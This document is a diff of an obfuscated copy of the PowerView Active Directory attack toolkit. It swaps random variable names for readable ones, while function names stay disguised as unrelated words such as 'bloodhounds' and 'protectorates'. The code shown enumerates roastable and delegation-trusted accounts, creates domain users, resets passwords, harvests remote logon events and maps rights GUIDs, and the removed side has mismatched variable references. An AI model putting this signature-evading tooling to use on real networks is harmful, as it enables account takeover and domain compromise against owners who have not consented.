-                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
+                Write-Verbose '[prissier] Searching for users who are sensitive and not trusted for delegation'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
             }
             if ($PSBoundParameters['AdminCount']) {
-                Write-Verbose '[township] Searching for adminCount=1'
-                $kXbEpVCq99 += '(admincount=1)'
+                Write-Verbose '[prissier] Searching for adminCount=1'
+                $Filter += '(admincount=1)'
             }
             if ($PSBoundParameters['TrustedToAuth']) {
-                Write-Verbose '[township] Searching for users that are trusted to authenticate for other principals'
-                $kXbEpVCq99 += '(msds-allowedtodelegateto=*)'
+                Write-Verbose '[prissier] Searching for users that are trusted to authenticate for other principals'
+                $Filter += '(msds-allowedtodelegateto=*)'
             }
             if ($PSBoundParameters['PreauthNotRequired']) {
-                Write-Verbose '[township] Searching for user accounts that do not require kerberos preauthenticate'
-                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
+                Write-Verbose '[prissier] Searching for user accounts that do not require kerberos preauthenticate'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[township] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[prissier] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
+            $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
-                    $aHFybRCW99 = $_.Substring(4)
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
-                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
+                    $UACField = $_.Substring(4)
+                    $UACValue = [Int]($UACEnum::$UACField)
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
-                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
-                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
+                    $UACValue = [Int]($UACEnum::$_)
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
-            $llxUonve99.filter = "(&(samAccountType=805306368)$kXbEpVCq99)"
-            Write-Verbose "[township] filter string: $($llxUonve99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $llxUonve99.FindOne() }
-            else { $pfqXXMQd99 = $llxUonve99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
+            Write-Verbose "[prissier] filter string: $($UserSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
+            else { $Results = $UserSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
                     $User = $_
                     $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                 }
                 else {
-                    $User = Buddy -Properties $_.Properties
+                    $User = bookie -Properties $_.Properties
                     $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                 }
                 $User
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[township] Error disposing of the Results object: $_"
+                    Write-Verbose "[prissier] Error disposing of the Results object: $_"
                 }
             }
-            $llxUonve99.dispose()
+            $UserSearcher.dispose()
         }
     }
 }
-function jam {
+function protectorates {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
@@ -2542,68 +2542,68 @@ function jam {
         [Parameter(Mandatory = $True)]
         [ValidateLength(0, 256)]
         [String]
-        $xjbZUAHW99,
+        $SamAccountName,
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [Alias('Password')]
         [Security.SecureString]
-        $MOHGouiL99,
+        $AccountPassword,
         [ValidateNotNullOrEmpty()]
         [String]
         $Name,
         [ValidateNotNullOrEmpty()]
         [String]
-        $LyNjMZjk99,
+        $DisplayName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $zdmbPkzH99,
+        $Description,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    $cqurrley99 = @{
-        'Identity' = $xjbZUAHW99
+    $ContextArguments = @{
+        'Identity' = $SamAccountName
     }
-    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
-    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
-    $JBFcwhcg99 = Piedmont @ContextArguments
-    if ($JBFcwhcg99) {
-        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($JBFcwhcg99.Context)
-        $User.SamAccountName = $JBFcwhcg99.Identity
-        $mtbkfkil99 = New-Object System.Management.Automation.PSCredential('a', $MOHGouiL99)
-        $User.SetPassword($mtbkfkil99.GetNetworkCredential().Password)
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = demarcates @ContextArguments
+    if ($Context) {
+        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)
+        $User.SamAccountName = $Context.Identity
+        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+        $User.SetPassword($TempCred.GetNetworkCredential().Password)
         $User.Enabled = $True
         $User.PasswordNotRequired = $False
         if ($PSBoundParameters['Name']) {
             $User.Name = $Name
         }
         else {
-            $User.Name = $JBFcwhcg99.Identity
+            $User.Name = $Context.Identity
         }
         if ($PSBoundParameters['DisplayName']) {
-            $User.DisplayName = $LyNjMZjk99
+            $User.DisplayName = $DisplayName
         }
         else {
-            $User.DisplayName = $JBFcwhcg99.Identity
+            $User.DisplayName = $Context.Identity
         }
         if ($PSBoundParameters['Description']) {
-            $User.Description = $zdmbPkzH99
+            $User.Description = $Description
         }
-        Write-Verbose "[jam] Attempting to create user '$xjbZUAHW99'"
+        Write-Verbose "[protectorates] Attempting to create user '$SamAccountName'"
         try {
             $Null = $User.Save()
-            Write-Verbose "[jam] User '$xjbZUAHW99' successfully created"
+            Write-Verbose "[protectorates] User '$SamAccountName' successfully created"
             $User
         }
         catch {
-            Write-Warning "[jam] Error creating user '$xjbZUAHW99' : $_"
+            Write-Warning "[protectorates] Error creating user '$SamAccountName' : $_"
         }
     }
 }
-function unseemly {
+function bloodhounds {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
@@ -2611,43 +2611,43 @@ function unseemly {
         [Parameter(Position = 0, Mandatory = $True)]
         [Alias('UserName', 'UserIdentity', 'User')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [Alias('Password')]
         [Security.SecureString]
-        $MOHGouiL99,
+        $AccountPassword,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    $cqurrley99 = @{ 'Identity' = $BfpbWwpi99 }
-    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
-    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
-    $JBFcwhcg99 = Piedmont @ContextArguments
-    if ($JBFcwhcg99) {
-        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($JBFcwhcg99.Context, $BfpbWwpi99)
+    $ContextArguments = @{ 'Identity' = $Identity }
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = demarcates @ContextArguments
+    if ($Context) {
+        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)
         if ($User) {
-            Write-Verbose "[unseemly] Attempting to set the password for user '$BfpbWwpi99'"
+            Write-Verbose "[bloodhounds] Attempting to set the password for user '$Identity'"
             try {
-                $mtbkfkil99 = New-Object System.Management.Automation.PSCredential('a', $MOHGouiL99)
-                $User.SetPassword($mtbkfkil99.GetNetworkCredential().Password)
+                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+                $User.SetPassword($TempCred.GetNetworkCredential().Password)
                 $Null = $User.Save()
-                Write-Verbose "[unseemly] Password for user '$BfpbWwpi99' successfully reset"
+                Write-Verbose "[bloodhounds] Password for user '$Identity' successfully reset"
             }
             catch {
-                Write-Warning "[unseemly] Error setting password for user '$BfpbWwpi99' : $_"
+                Write-Warning "[bloodhounds] Error setting password for user '$Identity' : $_"
             }
         }
         else {
-            Write-Warning "[unseemly] Unable to find user '$BfpbWwpi99'"
+            Write-Warning "[bloodhounds] Unable to find user '$Identity'"
         }
     }
 }
-function niftiest {
+function Alisa {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LogonEvent')]
     [OutputType('PowerView.ExplicitCredentialLogonEvent')]
@@ -2657,22 +2657,22 @@ function niftiest {
         [Alias('dnshostname', 'HostName', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = $Env:COMPUTERNAME,
+        $ComputerName = $Env:COMPUTERNAME,
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $CtVXbzbF99 = [DateTime]::Now.AddDays(-1),
+        $StartTime = [DateTime]::Now.AddDays(-1),
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $FVDtcdtR99 = [DateTime]::Now,
+        $EndTime = [DateTime]::Now,
         [ValidateRange(1, 1000000)]
         [Int]
-        $OoLNhUlP99 = 5000,
+        $MaxEvents = 5000,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $suepzcTB99 = @"
+        $XPathFilter = @"
 <QueryList>
     <Query Id="0" Path="Security">
         <!-- Logon events -->
@@ -2684,7 +2684,7 @@ function niftiest {
                     ]
                     and (Level=4 or Level=0) and (EventID=4624)
                     and TimeCreated[
-                        @SystemTime&gt;='$($CtVXbzbF99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($FVDtcdtR99.ToUniversalTime().ToString('s'))'
+                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                     ]
                 ]
             ]
@@ -2700,7 +2700,7 @@ function niftiest {
                     ]
                     and (Level=4 or Level=0) and (EventID=4648)
                     and TimeCreated[
-                        @SystemTime&gt;='$($CtVXbzbF99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($FVDtcdtR99.ToUniversalTime().ToString('s'))'
+                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                     ]
                 ]
             ]
@@ -2731,81 +2731,81 @@ function niftiest {
     </Query>
 </QueryList>
 "@
-        $mMveqDsv99 = @{
-            'FilterXPath' = $suepzcTB99
+        $EventArguments = @{
+            'FilterXPath' = $XPathFilter
             'LogName' = 'Security'
-            'MaxEvents' = $OoLNhUlP99
+            'MaxEvents' = $MaxEvents
         }
-        if ($PSBoundParameters['Credential']) { $mMveqDsv99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $mMveqDsv99['ComputerName'] = $cXOPCAwl99
+        ForEach ($Computer in $ComputerName) {
+            $EventArguments['ComputerName'] = $Computer
             Get-WinEvent @EventArguments| ForEach-Object {
                 $Event = $_
-                $SdzJuWMG99 = $Event.Properties
+                $Properties = $Event.Properties
                 Switch ($Event.Id) {
                     4624 {
-                        if(-not $SdzJuWMG99[5].Value.EndsWith('$')) {
-                            $ERfozkEO99 = New-Object PSObject -Property @{
-                                ComputerName              = $cXOPCAwl99
+                        if(-not $Properties[5].Value.EndsWith('$')) {
+                            $Output = New-Object PSObject -Property @{
+                                ComputerName              = $Computer
                                 TimeCreated               = $Event.TimeCreated
                                 EventId                   = $Event.Id
-                                SubjectUserSid            = $SdzJuWMG99[0].Value.ToString()
-                                SubjectUserName           = $SdzJuWMG99[1].Value
-                                SubjectDomainName         = $SdzJuWMG99[2].Value
-                                SubjectLogonId            = $SdzJuWMG99[3].Value
-                                TargetUserSid             = $SdzJuWMG99[4].Value.ToString()
-                                TargetUserName            = $SdzJuWMG99[5].Value
-                                TargetDomainName          = $SdzJuWMG99[6].Value
-                                TargetLogonId             = $SdzJuWMG99[7].Value
-                                LogonType                 = $SdzJuWMG99[8].Value
-                                LogonProcessName          = $SdzJuWMG99[9].Value
-                                AuthenticationPackageName = $SdzJuWMG99[10].Value
-                                WorkstationName           = $SdzJuWMG99[11].Value
-                                LogonGuid                 = $SdzJuWMG99[12].Value
-                                TransmittedServices       = $SdzJuWMG99[13].Value
-                                LmPackageName             = $SdzJuWMG99[14].Value
-                                KeyLength                 = $SdzJuWMG99[15].Value
-                                ProcessId                 = $SdzJuWMG99[16].Value
-                                ProcessName               = $SdzJuWMG99[17].Value
-                                IpAddress                 = $SdzJuWMG99[18].Value
-                                IpPort                    = $SdzJuWMG99[19].Value
-                                ImpersonationLevel        = $SdzJuWMG99[20].Value
-                                RestrictedAdminMode       = $SdzJuWMG99[21].Value
-                                TargetOutboundUserName    = $SdzJuWMG99[22].Value
-                                TargetOutboundDomainName  = $SdzJuWMG99[23].Value
-                                VirtualAccount            = $SdzJuWMG99[24].Value
-                                TargetLinkedLogonId       = $SdzJuWMG99[25].Value
-                                ElevatedToken             = $SdzJuWMG99[26].Value
+                                SubjectUserSid            = $Properties[0].Value.ToString()
+                                SubjectUserName           = $Properties[1].Value
+                                SubjectDomainName         = $Properties[2].Value
+                                SubjectLogonId            = $Properties[3].Value
+                                TargetUserSid             = $Properties[4].Value.ToString()
+                                TargetUserName            = $Properties[5].Value
+                                TargetDomainName          = $Properties[6].Value
+                                TargetLogonId             = $Properties[7].Value
+                                LogonType                 = $Properties[8].Value
+                                LogonProcessName          = $Properties[9].Value
+                                AuthenticationPackageName = $Properties[10].Value
+                                WorkstationName           = $Properties[11].Value
+                                LogonGuid                 = $Properties[12].Value
+                                TransmittedServices       = $Properties[13].Value
+                                LmPackageName             = $Properties[14].Value
+                                KeyLength                 = $Properties[15].Value
+                                ProcessId                 = $Properties[16].Value
+                                ProcessName               = $Properties[17].Value
+                                IpAddress                 = $Properties[18].Value
+                                IpPort                    = $Properties[19].Value
+                                ImpersonationLevel        = $Properties[20].Value
+                                RestrictedAdminMode       = $Properties[21].Value
+                                TargetOutboundUserName    = $Properties[22].Value
+                                TargetOutboundDomainName  = $Properties[23].Value
+                                VirtualAccount            = $Properties[24].Value
+                                TargetLinkedLogonId       = $Properties[25].Value
+                                ElevatedToken             = $Properties[26].Value
                             }
-                            $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
-                            $ERfozkEO99
+                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
+                            $Output
                         }
                     }
                     4648 {
-                        if((-not $SdzJuWMG99[5].Value.EndsWith('$')) -and ($SdzJuWMG99[11].Value -match 'taskhost\.exe')) {
-                            $ERfozkEO99 = New-Object PSObject -Property @{
-                                ComputerName              = $cXOPCAwl99
+                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
+                            $Output = New-Object PSObject -Property @{
+                                ComputerName              = $Computer
                                 TimeCreated       = $Event.TimeCreated
                                 EventId           = $Event.Id
-                                SubjectUserSid    = $SdzJuWMG99[0].Value.ToString()
-                                SubjectUserName   = $SdzJuWMG99[1].Value
-                                SubjectDomainName = $SdzJuWMG99[2].Value
-                                SubjectLogonId    = $SdzJuWMG99[3].Value
-                                LogonGuid         = $SdzJuWMG99[4].Value.ToString()
-                                TargetUserName    = $SdzJuWMG99[5].Value
-                                TargetDomainName  = $SdzJuWMG99[6].Value
-                                TargetLogonGuid   = $SdzJuWMG99[7].Value
-                                TargetServerName  = $SdzJuWMG99[8].Value
-                                TargetInfo        = $SdzJuWMG99[9].Value
-                                ProcessId         = $SdzJuWMG99[10].Value
-                                ProcessName       = $SdzJuWMG99[11].Value
-                                IpAddress         = $SdzJuWMG99[12].Value
-                                IpPort            = $SdzJuWMG99[13].Value
+                                SubjectUserSid    = $Properties[0].Value.ToString()
+                                SubjectUserName   = $Properties[1].Value
+                                SubjectDomainName = $Properties[2].Value
+                                SubjectLogonId    = $Properties[3].Value
+                                LogonGuid         = $Properties[4].Value.ToString()
+                                TargetUserName    = $Properties[5].Value
+                                TargetDomainName  = $Properties[6].Value
+                                TargetLogonGuid   = $Properties[7].Value
+                                TargetServerName  = $Properties[8].Value
+                                TargetInfo        = $Properties[9].Value
+                                ProcessId         = $Properties[10].Value
+                                ProcessName       = $Properties[11].Value
+                                IpAddress         = $Properties[12].Value
+                                IpPort            = $Properties[13].Value
                             }
-                            $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
-                            $ERfozkEO99
+                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
+                            $Output
                         }
                     }
                     default {
@@ -2816,92 +2816,92 @@ function niftiest {
         }
     }
 }
-function fault {
+function accommodated {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
-    $OWRXcbAe99 = @{}
-    if ($PSBoundParameters['Credential']) { $OWRXcbAe99['Credential'] = $gxazvivN99 }
+    $ForestArguments = @{}
+    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }
     try {
-        $GXpegEIL99 = (ampere @ForestArguments).schema.name
+        $SchemaPath = (chicaneries @ForestArguments).schema.name
     }
     catch {
-        throw '[fault] Error in retrieving forest schema path from ampere'
+        throw '[accommodated] Error in retrieving forest schema path from chicaneries'
     }
-    if (-not $GXpegEIL99) {
-        throw '[fault] Error in retrieving forest schema path from ampere'
+    if (-not $SchemaPath) {
+        throw '[accommodated] Error in retrieving forest schema path from chicaneries'
     }
-    $PPosolen99 = @{
-        'SearchBase' = $GXpegEIL99
+    $SearcherArguments = @{
+        'SearchBase' = $SchemaPath
         'LDAPFilter' = '(schemaIDGUID=*)'
     }
-    if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-    if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-    if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-    if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-    if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-    $cUkPcIDK99 = watersides @SearcherArguments
-    if ($cUkPcIDK99) {
+    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+    $SchemaSearcher = deadly @SearcherArguments
+    if ($SchemaSearcher) {
         try {
-            $pfqXXMQd99 = $cUkPcIDK99.FindAll()
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $Results = $SchemaSearcher.FindAll()
+            $Results | Where-Object {$_} | ForEach-Object {
                 $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[fault] Error disposing of the Results object: $_"
+                    Write-Verbose "[accommodated] Error disposing of the Results object: $_"
                 }
             }
-            $cUkPcIDK99.dispose()
+            $SchemaSearcher.dispose()
         }
         catch {
-            Write-Verbose "[fault] Error in building GUID map: $_"
+            Write-Verbose "[accommodated] Error in building GUID map: $_"
         }
     }
-    $PPosolen99['SearchBase'] = $GXpegEIL99.replace('Schema','Extended-Rights')
-    $PPosolen99['LDAPFilter'] = '(objectClass=controlAccessRight)'
-    $QGxkKYIV99 = watersides @SearcherArguments
-    if ($QGxkKYIV99) {
+    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
+    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
+    $RightsSearcher = deadly @SearcherArguments
+    if ($RightsSearcher) {
         try {
-            $pfqXXMQd99 = $QGxkKYIV99.FindAll()
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $Results = $RightsSearcher.FindAll()
+            $Results | Where-Object {$_} | ForEach-Object {
                 $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[fault] Error disposing of the Results object: $_"
+                    Write-Verbose "[accommodated] Error disposing of the Results object: $_"
                 }
             }
-            $QGxkKYIV99.dispose()
+            $RightsSearcher.dispose()
         }
         catch {
-            Write-Verbose "[fault] Error in building GUID map: $_"
+            Write-Verbose "[accommodated] Error in building GUID map: $_"
         }
     }
     $GUIDs
 }
-function doubtlessly {
+function sonorous {
     [OutputType('PowerView.Computer')]
     [OutputType('PowerView.Computer.Raw')]
     [CmdletBinding()]
@@ -2909,201 +2909,201 @@ function doubtlessly {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('SamAccountName', 'Name', 'DNSHostName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [Switch]
-        $DZNONYED99,
+        $Unconstrained,
         [Switch]
-        $cfgWMxwo99,
+        $TrustedToAuth,
         [Switch]
-        $dJaVBXfR99,
+        $Printers,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePrincipalName')]
         [String]
         $SPN,
         [ValidateNotNullOrEmpty()]
         [String]
-        $wSsSBiPZ99,
+        $OperatingSystem,
         [ValidateNotNullOrEmpty()]
         [String]
-        $qoqQUCpy99,
+        $ServicePack,
         [ValidateNotNullOrEmpty()]
         [String]
-        $nqApdsmI99,
+        $SiteName,
         [Switch]
         $Ping,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     DynamicParam {
-        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
-        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
-        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
+        $UACValueNames = [Enum]::GetNames($UACEnum)
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
+        footnotes -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $fTlnGmRy99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $CompSearcher = deadly @SearcherArguments
     }
     PROCESS {
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            coup -CreateVariables -BoundParameters $PSBoundParameters
+            footnotes -CreateVariables -BoundParameters $PSBoundParameters
         }
-        if ($fTlnGmRy99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^S-1-') {
-                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+        if ($CompSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($QghnbJOP99 -match '^CN=') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                elseif ($IdentityInstance -match '^CN=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
